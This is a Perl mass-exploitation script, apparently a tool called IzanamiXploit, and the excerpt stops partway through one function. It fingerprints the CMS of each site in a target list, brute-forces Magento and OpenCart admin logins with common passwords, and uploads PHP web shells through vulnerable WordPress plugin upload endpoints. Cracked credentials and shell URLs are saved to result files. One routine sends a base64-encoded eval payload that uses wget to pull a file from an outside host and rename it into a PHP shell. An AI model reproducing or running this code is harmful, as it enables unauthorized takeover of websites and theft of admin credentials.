#!/usr/bin/perl
use LWP::UserAgent;
use Getopt::Long;
use Parallel::ForkManager;
use HTTP::Request::Common;
use Term::ANSIColor;
use HTTP::Request::Common qw(GET);
use Getopt::Long;
use HTTP::Request;
use LWP::UserAgent;
use MIME::Base64;
use IO::Select;
use HTTP::Cookies;
use HTTP::Response;
use Term::ANSIColor;
use HTTP::Request::Common qw(POST);
use URI::URL;
use DBI;
use IO::Socket::INET;
#$ag = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });#Https websites accept
$ag = LWP::UserAgent->new();
$ag->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ag->timeout(10);
system('cls');
my $datestring = localtime();
my ($sec,$min,$hour,$mday,$mon,$year,$wday,$yday,$isdst) = localtime();
 
our($list,$thread); 
sub randomagent {
my @array = ('Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0',
'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20120101 Firefox/29.0',
'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)',
'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36',
'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31'
);
my $random = $array[rand @array];
return($random);
}
GetOptions(
    'url|u=s' => \$list,
    'threads|t=i'	=> \$thread,
) || &flag();
 
if(!defined($list) || !defined($thread)){
	&flag();
        exit;
}
 
print "[+] Start Run Bot : $datestring\n";


my $ua = LWP::UserAgent->new;
$ua->timeout(20);

@months = qw(01 02 03 04 05 06 07 08 09 10 11 12);
($second, $minute, $hour, $dayOfMonth, $month, $yearOffset, $dayOfWeek, $dayOfYear, $daylightSavings) = localtime();
$year = 1900 + $yearOffset;
$month = "$months[$month] ";
my $datetime    = localtime;

system("IzanamiXploit V 3.0");
if ($^O =~ /MSWin32/) {system("cls"); }else { system("clear"); }
print color('bold green');

$Result="Result";
    if (-e $Result) 
    {
    }
    else
    {
        mkdir $Result or die "Error creating directory: $Result";
    }

$rez="Result";
    if (-e $rez) 
    {
    }
    else
    {
        mkdir $rez or die "Error creating directory: $rez";
    }



print q(

);

print color('reset');
print "                       ";

$a = 0;
open (THETARGET, "<$list") || die "[+] Can't open the file";
@TARGETS = <THETARGET>;
close THETARGET;
$link=$#TARGETS + 1;


print color("bold white"), "- All Site : ";
print color("bold yellow"), "".scalar(@TARGETS)."\n\n";
print color('reset');
my $pm = new Parallel::ForkManager($thread);# preparing fork
OUTER: foreach $site(@TARGETS){#loop => working
my $pid = $pm->start and next;
chomp($site);
if($site !~ /http:\/\//) { $site = "$site/"; };
$a++;
cms();
    $pm->finish;
}
$pm->wait_all_children();

################ CMS DETCTER #####################
sub cms(){
##$ua = LWP::UserAgent->new(keep_alive => 1);
$ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
$ua->timeout (20);
my $cms = $ua->get("$site")->content;
my $cmsd = $ua->get("$site/wp-includes/js/jquery/jquery.js")->content;
$wpsite = $site . '/wp-login.php';
my $wpcms = $ua->get("$wpsite")->content;
$jsite2 = $site . '/language/en-GB/en-GB.xml';
my $jcms = $ua->get("$jsite2")->content;
my $cms1 = $ua->get("$site/forum/register.php")->content;
$wpsite2 = $site . '/blog/wp-login.php';
my $wpcms2 = $ua->get("$wpsite2")->content;
my $wpcms3 = $ua->get("$site/wp/")->content;
my $wpcms4 = $ua->get("$site/wp47/")->content;
my $wpcms5 = $ua->get("$site/wordpress/")->content;
my $jx = $ua->get("$site/administrator/")->content;
my $jxx = $ua->get("$site/joomla/")->content;
$magsite = $site . '/admin';
my $magcms = $ua->get("$magsite")->content;
$dursite = $site . '/user/login';
my $durcms = $ua->get("$dursite")->content;
$lokomedia = "$site/smiley/1.gif";
my $lokomediacms = $ua->get("$lokomedia")->content_type;
$loko = "$site/rss.xml";
my $lokomediacmstow = $ua->get("$loko")->content;

if($cms =~/<script type=\"text\/javascript\" src=\"\/media\/system\/js\/mootools.js\"><\/script>| \/media\/system\/js\/|mootools-core.js|com_content|Joomla!/) {
print color('bold white'),"\n[+] $site - ";
    print color("bold white"), "Joomla\n\n";
    print color('reset');
    open(save, '>>Cms/Joomla.txt');
    print save "$site\n";   
    close(save);
    exploitjoom();
}
elsif($cms =~/vBulletin|register.php|vbulletin|<meta name="description" content="vBulletin Forums" \/>|<meta name="generator" content="vBulletin" \/>|vBulletin.version =|"baseurl_core":/) {
print color('bold white'),"\n[+] $site - ";
    print color("bold white"), "Vbulletin\n\n";
    print color('reset');
    open(save, '>>Cms/vbulletin.txt');
    print save "$site\n";   
    close(save);

}
elsif($cms1 =~/vBulletin|vb_meta_bburl|vb_login_md5password|"baseurl_core":/) {
print color('bold white'),"\n[+] $site - ";
    print color("bold white"), "Vbulletin-forum\n\n";
    print color('reset');
    open(save, '>>Cms/vbulletin.txt');
    print save "$site\n";   
    close(save);
$site = $site . '/forum';	

}
elsif($cms =~/wp-content/) {
    print color('bold white'),"\n[+] $site - ";
    print color("bold white"), "WordPress\n\n"; 
    print color('reset'); 
    open(save, '>>Cms/Wordpress.txt');
    print save "$site\n"; 
    close(save);
    exploitwp();
}
elsif($wpcms =~/wp-admin/) {
    print color('bold white'),"\n[+] $site - ";
    print color("bold white"), "WordPress\n\n"; 
    print color('reset'); 
    open(save, '>>Cms/Wordpress.txt');
    print save "$site\n"; 
    close(save);
    exploitwp();
}
elsif($wpcms2 =~/wp-content/) {
    print color('bold white'),"\n[+] $site - ";
    print color("bold white"), "WordPress-blog\n\n"; 
    print color('reset'); 
    open(save, '>>Cms/Wordpress.txt');
    print save "$site\n"; 
    close(save);
$site = $site . '/blog/';	
    exploitwp();
}
elsif($wpcms3 =~/wp-content|wordpress/) {
    print color('bold white'),"\n[+] $site - ";
    print color("bold white"), "WordPress-wp\n\n"; 
    print color('reset'); 
    open(save, '>>Cms/Wordpress.txt');
    print save "$site\n"; 
    close(save);
$site = $site . '/wp/';	
    exploitwp();
}
elsif($wpcms4 =~/wp-content|wordpress/) {
    print color('bold white'),"\n[+] $site - ";
    print color("bold white"), "WordPress-wp47\n\n"; 
    print color('reset'); 
    open(save, '>>Cms/Wordpress.txt');
    print save "$site\n"; 
    close(save);
$site = $site . '/wp47/';	
    exploitwp();
}
elsif($wpcms5 =~/wp-content|wordpress/) {
    print color('bold white'),"\n[+] $site - ";
    print color("bold white"), "WordPress-wordpress\n\n"; 
    print color('reset'); 
    open(save, '>>Cms/Wordpress.txt');
    print save "$site\n"; 
    close(save);
$site = $site . '/wordpress/';	
    exploitwp();
}
elsif($cmsd =~/password/) {
    print color('bold white'),"\n[+] $site - ";
    print color("bold white"), "WordPress\n\n"; 
    print color('reset'); 
    open(save, '>>Cms/Wordpress.txt');
    print save "$site\n"; 
    close(save);
    exploitwp();
}
elsif($durcms =~/Drupal|drupal|sites/) {
    print color('bold white'),"\n[+] $site - ";
    print color("bold white"), "DruPal\n\n";
    print color('reset');
    open(save, '>>Cms/Drupal.txt');
    print save "$site\n";   
    close(save);
	drupal();
}
elsif($magcms =~/Log into Magento Admin Page|name=\"dummy\" id=\"dummy\"|Magento/) {
print color('bold white'),"\n[+] $site - ";
    print color("bold white"), "Magento\n\n";
    print color('reset');
    open(save, '>>Cms/Magento.txt');
    print save "$site\n";   
    close(save);
  magento();
  magentox();
}

elsif($cms =~/route=product|OpenCart|route=common|catalog\/view\/theme/) {
print color('bold white'),"\n[+] $site - ";
    print color("bold white"), "Opencart\n\n";
    print color('reset');
    open(save, '>>Cms/Opencart.txt');
    print save "$site\n";   
    close(save);
	opencart();
}
elsif($cms =~/xenforo|XenForo|uix_sidePane_content/) {
    print color('bold white'),"\n[+] $site - ";
    print color("bold white"), "XenForo\n\n"; 
    print color('reset'); 
    open(save, '>>Cms/XenForo.txt');
    print save "$site\n"; 
    close(save);

}
elsif($jcms =~/joomla|com_content|Joomla!/) {
print color('bold white'),"\n[+] $site - ";
    print color("bold white"), "Joomla\n\n";
    print color('reset');
    open(save, '>>Cms/Joomla.txt');
    print save "$site\n";   
    close(save);
    exploitjoom();
}
elsif($jx =~/com_option|com_content|Joomla!/) {
print color('bold white'),"\n[+] $site - ";
    print color("bold white"), "Joomla\n\n";
    print color('reset');
    open(save, '>>Cms/Joomla.txt');
    print save "$site\n";   
    close(save);
$site = $site . '/joomla/';	
    exploitjoom();
}
elsif($jxx =~/com_option|com_content|Joomla!/) {
print color('bold white'),"\n[+] $site - ";
    print color("bold white"), "Joomla\n\n";
    print color('reset');
    open(save, '>>Cms/Joomla.txt');
    print save "$site\n";   
    close(save);
    exploitjoom();
}
elsif($cms =~/Prestashop|prestashop/) {
    print color('bold white'),"\n[+] $site - ";
    print color("bold white"), "Prestashop\n\n";
    print color('reset');
    open(save, '>>Cms/Prestashop.txt');
    print save "$site\n";   
    close(save);



columnadverts();
soopamobile();
soopabanners();
vtermslideshow();
simpleslideshow();
productpageadverts();
homepageadvertise();
homepageadvertise2();
jro_homepageadvertise();
attributewizardpro();
oneattributewizardpro();
attributewizardproOLD();
attributewizardpro_x();
advancedslider();
cartabandonmentpro();
cartabandonmentproOld();
videostab();
wg24themeadministration();
fieldvmegamenu();
wdoptionpanel();
pk_flexmenu();
pk_vertflexmenu();
nvn_export_orders();
megamenu();
tdpsthemeoptionpanel();
psmodthemeoptionpanel();
masseditproduct();
blocktestimonial();
}
elsif($lokomediacms =~/image\/gif/) {
print color('bold white'),"\n[+] $site - ";
    print color("bold white"), "Lokomedia\n\n";
    print color('reset');
    open(save, '>>Cms/lokomedia.txt');
    print save "$site\n";   
    close(save);
    lokomedia();
}
elsif($lokomediacmstow =~/lokomedia/) {
print color('bold white'),"\n[+] $site - ";
    print color("bold white"), "Lokomedia\n\n";
    print color('reset');
    open(save, '>>Cms/lokomedia.txt');
    print save "$site\n";   
    close(save);
    lokomedia();
}

else{
print color('bold white'),"\n[+] $site - ";
    print color("bold white"), "Unknown\n\n"; 
    open(save, '>>Cms/Unknown.txt');
    print color('reset'); 
    print save "$site\n";   
    close(save);	
	#usql();
	#elfind();
	#kcfind();
	#apachistrus();
	#pma();	
}
}

sub exploitwp(){
    vers();
    addblockblocker();
    worce();
    wof();
    wof1();
	virald();
	viraldz();
	viraldzy();
	viraldzyx();	
	viraldd();
    wof2();
    wof3();	
    tst();	
    learndash();
    learndash2();
	wofind();	
	mms();
	xxsav();
    xxsd();
	at1();
	at2();
    viral();
    jsor();	
    wptema();	
    blaze();
    catpro();
	xxcc();	
	nineto();	
    cherry();
    downloadsmanager();
	expadd();
	expaddd();
    formcraft();
    formcraft2();
	brainstorm();
	xav();
	izxc();
    con7();	
    fuild();
    levoslideshow();
    vertical();
	carousel();
	superb();
	yass();
	homepage();
	ipage();
	bliss();	
    xdata();	
    powerzoomer();
    gravityforms();
    revslider();
    getconfig();
	getcpconfig();
    showbiz();
    ads();
    slideshowpro();
    wpmobiledetector();
    wysija();
    inboundiomarketing();
    dzszoomsounds();
    reflexgallery();
    sexycontactform();
	realestate();
    wtffu();
    wpjm();
    phpeventcalendar();
	phpeventcalendars();	
    synoptic();
	udesig();
	workf();
    Wpshop();
    wpinjection();
    adad();
    wplfd();
	wpbrute();
}
sub exploitjoom(){
  versij(); 
  comjce();
  comedia();
  comjdownloads();
  comfabrik();
  comfabi2();
  comfabrikdef2();
  foxfind(); 
  foxcontact();
  fox2(); 
  comadsmanager();
  comblog();
  b2j();
  b22j();
  sexycontactform();
  comusers();
  comweblinks();
  mod_simplefileupload();
  comjwallpapers();
  jomlfd();
  joomlabrute();
}


sub magento{
$magsite = $site . '/admin';

$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (30);
$ua->cookie_jar(
        HTTP::Cookies->new(
            file => 'mycookies.txt',
            autosave => 1
        )
    );
    
$getoken = $ua->get($magsite)->content;
if ( $getoken =~ /type="hidden" value="(.*)"/ ) {
$token = $1 ;
}else{
print "[+] Can't Grabb Magento Token !\n";
next OUTER;
}

print"[+] Start Brute Force";
@pats=('123456','admin123','123','1234','admin','password','root');
foreach $pmas(@pats){
chomp $pmas;
$maguser = "admin";
$magpass = $pmas;
print "\n[-] Trying: $magpass ";

$magbrute = POST $magsite, ["form_key" => "$token", "login[username]" => "$maguser", "dummy" => "", "login[password]" => "$magpass"];
$response = $ua->request($magbrute);
my $pwnd = $ua->get("$magsite")->content;
if ($pwnd =~ /logout/){
print "- ";
print color('bold green'),"CRACKED -> $magsite => User: $maguser Pass: $magpass\n";
print color('reset');
open (TEXT, '>>Result/magentopass.txt');
print TEXT "$magsite => User: $maguser Pass: $magpass\n";
close (TEXT);
next OUTER;
}
}
}
sub magentox{
system("php files/magento.php '$site'");
}
sub opencart{
print"[+] Start Brute Force";
@patsx=('123456','admin123','123','1234','admin','password','root');
foreach $pmasx(@patsx){
chomp $pmasx;
$ocuser = admin;
$ocpass = $pmasx;
print "\n[-] Trying: $ocpass ";
$OpenCart= $site . '/admin/index.php';

$ocbrute = POST $OpenCart, [username => $ocuser, password => $ocpass,];
$response = $ua->request($ocbrute);
$stat = $response->status_line;
if ($stat =~ /302/){
print "- ";
print color('bold green'),"CRACKED\n";
print color('reset');
open (TEXT, '>>Result/opencardpass.txt');
print TEXT "$OpenCart => User: $ocuser Pass: $ocpass\n";
close (TEXT);
next OUTER;
}
}
}

################ Version #####################
sub vers(){

$getversion = $ua->get($site)->content;

if($getversion =~/content="WordPress (.*?)"/) {
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Wp Version";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold white'),"";
print color('bold white'),"$1";
print color('bold white'),"\n";
open (TEXT, '>>Cms/version.txt');
print TEXT "wp => $site => $1\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Wp Version";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold red'),"FAILED";
print color('bold white'),"\n";}
}

################ Adblock Blocker #####################
sub addblockblocker(){

my $addblockurl = "$site/wp-admin/admin-ajax.php?action=getcountryuser&cs=2";
my $response = $ua->post($addblockurl, Content_Type => 'multipart/form-data', Content => [popimg => ["files/Izanami.php"],]);
$addblockup="$site/wp-content/uploads/$year/$month/Izanami.php?I=Xploit";
my $checkaddblock = $ua->get("$addblockup")->content;

if($checkaddblock =~/Izanami Xploit/) {
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Adblock Blocker";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold white'),"";
print color('bold green'),"OK";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $addblockup\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$addblockup\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Adblock Blocker";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold red'),"FAILED";
print color('bold white'),"\n";}
}

################ woocommerce RCE #####################
sub worce(){

my $addblockurl = "$site/produits/?items_per_page=%24%7b%40eval(base64_decode(cGFzc3RocnUoJ2NkIHdwLWNvbnRlbnQvdXBsb2Fkcy8yMDE4LzAxO3dnZXQgaHR0cDovL3d3dy5hd3RjLmFpZHQuZWR1Ly9jb21wb25lbnRzL2NvbV9iMmpjb250YWN0L3VwbG9hZHMvdHh0LnR4dDttdiB0eHQudHh0IGl6b20ucGhwJyk7))%7d&setListingType=grid";

my $checkaddblock = $ua->get("$addblockurl")->content;
$dmup="$site/wp-content/uploads/2018/01/Izanami.php";
my $checkdm = $ua->get("$dmup")->content;
if($checkdm =~/SangPujaan/) {
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"woocommerce RCE";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold white'),"";
print color('bold green'),"OK";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $addblockup\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$addblockup\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"woocommerce RCE";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold red'),"FAILED";
print color('bold white'),"\n";}
}
################ learndash #####################
sub learndash(){
my $url = "$site/";
my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(20);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");

my $url = "$site/";
my $response = $ua->post($url, Content_Type => 'multipart/form-data',Content => [ "post" => "foobar","course_id" => "foobar","uploadfile" => "foobar",'uploadfiles[]' => ["files/dayi.php.php"] ]);

my $check = $ua->get("$site/wp-content/uploads/assignments/dayi.php.")->content;
$dmup="$site/wp-content/uploads/assignments/ms-sitemple.php";
my $checkdm = $ua->get("$dmup")->content;
if($checkdm =~/SangPujaan/) {
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Learndash";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold white'),"";
print color('bold green'),"OK";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $dmup\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$dmup\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Learndash";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold red'),"FAILED";
print color('bold white'),"\n";
}
}
################ learndash #####################
sub learndash2(){
my $url = "$site/";
my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(20);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");

my $url = "$site/";
my $response = $ua->post($url, Content_Type => 'multipart/form-data',Content => [ "post" => "foobar","course_id" => "foobar","uploadfile" => "foobar",'uploadfiles[]' => ["files/Izanami.php.docx"] ]);


$dmup="$site/wp-content/uploads/assignments/Izanami.php.docx?I=Xploit";
my $checkdm = $ua->get("$dmup")->content;
if($checkdm =~/Izanami Xploit/) {
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Learndash Docx";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold white'),"";
print color('bold green'),"OK";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $dmup\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$dmup\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Learndash Docx";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold red'),"FAILED";
print color('bold white'),"\n";
}
}

################ woocommerce-files #####################
sub wof(){ 
my $url = "$site/wp-admin/admin-ajax.php";

my $response = $ua->post($url, Content_Type => 'multipart/form-data',Content => [ "value" => "nm_personalizedproduct_upload_file","value" => "upload.php",'file' => ["files/Izanami.phtml"] ]);

$zoomerup="$site/wp-content/uploads/product_files/Izanami.phtml?I=Xploit";
my $checkdm = $ua->get("$zoomerup")->content;
if($checkdm =~/Izanami Xploit/) {
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Wo product_files";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold green'),"OK";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $zoomerup\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$zoomerup\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Wo product_files";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold red'),"FAILED";
print color('bold white'),"\n";
}
}

################ woocommerce-post-files #####################
sub wof1(){ 
my $url = "$site/wp-admin/admin-ajax.php";

my $response = $ua->post($url, Content_Type => 'multipart/form-data',Content => [ "value" => "nm_postfront_upload_file","value" => "upload.php",'file' => ["files/Izanami.phtml"] ]);

$zoomerup="$site/wp-content/uploads/post_files/Izanami.phtml?I=Xploit";
my $checkdm = $ua->get("$zoomerup")->content;
if($checkdm =~/Izanami Xploit/) {
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Wo Post Fields";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold green'),"OK";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $zoomerup\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$zoomerup\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Wo Post Fields";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold red'),"FAILED";
print color('bold white'),"\n";
}
}
################ Viral Options #####################
sub virald(){

my $addblockurl = "$site/wp-admin/admin-post.php?task=wpmp_upload_previews";
my $response = $ua->post($addblockurl, Content_Type => 'multipart/form-data', Content => [Filedata => ["files/Izanami.php"]]);
$addblockup="$site/wp-content/uploads/wpmp-previews//Izanami.php?I=Xploit";
my $checkaddblock = $ua->get("$addblockup")->content;

if($checkaddblock =~/Izanami Xploit/) {
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Market Place";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold white'),"";
print color('bold green'),"OK";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $addblockup\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$addblockup\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Market Place";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold red'),"FAILED";
print color('bold white'),"\n";}
}
################ Viral Options #####################
sub viraldz(){

my $addblockurl = "$site/wp-content/plugins/uploader/uploadify/uploadify.php";
my $response = $ua->post($addblockurl, Content_Type => 'multipart/form-data', Content => ['folder'=>"/wp-content/uploads", Filedata => ["files/Izanami.php"]]);
$addblockup="$site/wp-content/uploads/Izanami.php?I=Xploit";
my $checkaddblock = $ua->get("$addblockup")->content;

if($checkaddblock =~/Izanami Xploit/) {
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"uploader Plugin";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold white'),"";
print color('bold green'),"OK";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $addblockup\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$addblockup\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"uploader Plugin";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold red'),"FAILED";
print color('bold white'),"\n";}
}
################ Viral Options #####################
sub viraldzy(){

my $addblockurl = "$site/wp-content/plugins/wp-property/third-party/uploadify/uploadify.php";
my $response = $ua->post($addblockurl, Content_Type => 'multipart/form-data', Content => [Filedata => ["files/Izanami.php"]]);
$addblockup="$site/wp-content/plugins/wp-property/third-party/uploadify/Izanami.php?I=Xploit";
my $checkaddblock = $ua->get("$addblockup")->content;

if($checkaddblock =~/Izanami Xploit/) {
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"wp-property";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold white'),"";
print color('bold green'),"OK";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $addblockup\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$addblockup\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"wp-property";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold red'),"FAILED";
print color('bold white'),"\n";}
}
################ Viral Options #####################
sub viraldzyx(){

my $addblockurl = "$site/wp-content/plugins/social-networking-e-commerce-1/classes/views/social-options/form_cat_add.php";
my $response = $ua->post($addblockurl, Content_Type => 'multipart/form-data', Content => ['config_path'=>'../../../../../../', image => ["files/Izanami.php"]]);
$addblockup="$site/wp-content/plugins/social-networking-e-commerce-1/images/uploads/Izanami.php?I=Xploit";
my $checkaddblock = $ua->get("$addblockup")->content;

if($checkaddblock =~/Izanami Xploit/) {
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"social-network";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold white'),"";
print color('bold green'),"OK";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $addblockup\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$addblockup\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"social-network";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold red'),"FAILED";
print color('bold white'),"\n";}
}
################ Viral Options #####################
sub viraldd(){

my $addblockurl = "$site/wp-admin/admin-ajax.php";
my $response = $ua->post($addblockurl, Content_Type => 'multipart/form-data', Content => ["action" => "nm_filemanager_upload_file","name" => "upload.php", file => ["files/Izanami.php"]]);
$addblockup="$site/wp-content/uploads/user_uploads/upload.php?I=Xploit";
my $checkaddblock = $ua->get("$addblockup")->content;

if($checkaddblock =~/Izanami Xploit/) {
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Front end file";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold white'),"";
print color('bold green'),"OK";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $addblockup\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$addblockup\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Front end file";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold red'),"FAILED";
print color('bold white'),"\n";}
}

################ magic-fields #####################
sub wof2(){ 
my $url = "$site/wp-content/plugins/magic-fields/RCCWP_upload_ajax.php";

my $response = $ua->post($url, Content_Type => 'multipart/form-data',Content => [ 'qqfile' => ["files/Izanami.php"] ]);

$zoomerup="$site/wp-content/files_mf/Izanami.php?I=Xploit";
my $checkdm = $ua->get("$zoomerup")->content;
if($checkdm =~/Izanami Xploit/) {
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"magic-fields";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold green'),"OK";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $zoomerup\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$zoomerup\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"magic-fields";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold red'),"FAILED";
print color('bold white'),"\n";
}
}

################ estatic #####################
sub wof3(){ 
my $url = "$site";

my $response = $ua->post($url, Content_Type => 'multipart/form-data',Content => [ "value" => "Import",'importfile' => ["files/Izanami.php"] ]);

$zoomerup="$site/wp-content/plugins/ecstatic/Izanami.php?I=Xploit";
my $checkdm = $ua->get("$zoomerup")->content;
if($checkdm =~/Izanami Xploit/) {
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Ecstatic Exp";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold green'),"OK";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
